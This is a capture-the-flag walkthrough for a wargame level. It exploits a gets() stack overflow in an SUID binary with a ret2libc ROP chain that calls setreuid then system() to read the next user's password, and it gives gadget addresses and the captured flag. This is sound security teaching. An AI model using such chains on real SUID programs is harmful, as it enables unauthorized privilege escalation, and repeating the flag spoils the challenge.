# level03 — walkthrough

**Binary:** `/home/level03/armitage` (SUID `flag03`, x86-64)
**Goal:** read `/home/flag03/.pass`

## 1. Recon
```
checksec: No PIE (0x400000), No canary, GNU_STACK = RW (NX ON), ASLR off.
```
`queue_job()`:
```c
char msg[MSG_SIZE];        // 128 bytes at rbp-0x80
gets(msg);                 // unbounded read -> classic stack overflow
...
if (validate_job(msg))     // requires msg to start with "JOB"
    strncpy(job_queue[0].payload, msg + 4, MSG_SIZE - 1);   // -> .bss 0x40408c
```
No privilege drop, so euid stays `flag03`.

## 2. The bug
`gets()` has no bound, so the return address of `queue_job` (at `rbp+8`,
**offset 136** = 128-byte buffer + saved rbp) is overwritten. But the stack is
**non-executable**, so no shellcode — we return into libc (ret2libc). No-PIE +
ASLR-off means libc is at a constant base `0x7ffff7c00000`.

## 3. Keeping the privilege
`system()` runs `/bin/sh`, and dash **drops euid to ruid** at startup, so a raw
`system("/bin/cat ...")` would run as `level03`. We first
`setreuid(flag03, flag03)` so ruid == euid == flag03; then dash keeps the
privilege.

## 4. Where does the command string come from?
`validate_job` requires `"JOB"`, and on success `queue_job` copies `msg+4` into
the global `job_queue[0].payload` at the fixed address **0x40408c**. So the same
input that overflows the stack also plants our command string in a known .bss
slot, which we pass to `system()`.

## 5. ROP chain
```
pop rdi ; ret            ; 1020            \
pop rsi ; add rsp,0x10   ; 1020 + 3 filler  } setreuid(1020, 1020)
   ; pop rbx ; ret       ;                  /
setreuid
pop rdi ; ret            ; 0x40408c
ret                      ; 16-byte alignment for system()'s movaps
system                   ; system("/bin/cat /home/flag03/.pass")
```
Gadget note: the clean `pop rsi ; ret` in this libc is at `...10a7d`, whose
second byte is `0x0a` — a newline that `gets()` stops on. We dodge it with
`pop rsi ; add rsp,0x10 ; pop rbx ; ret` (`...586df`) plus three filler qwords.

## 6. Run
```
python3 exploit.py | /home/level03/armitage
-> 8c33zqo7hytqnsx9h3nb4juf3rdjbd80
```

**flag03 = `8c33zqo7hytqnsx9h3nb4juf3rdjbd80`** (SSH password for level04)
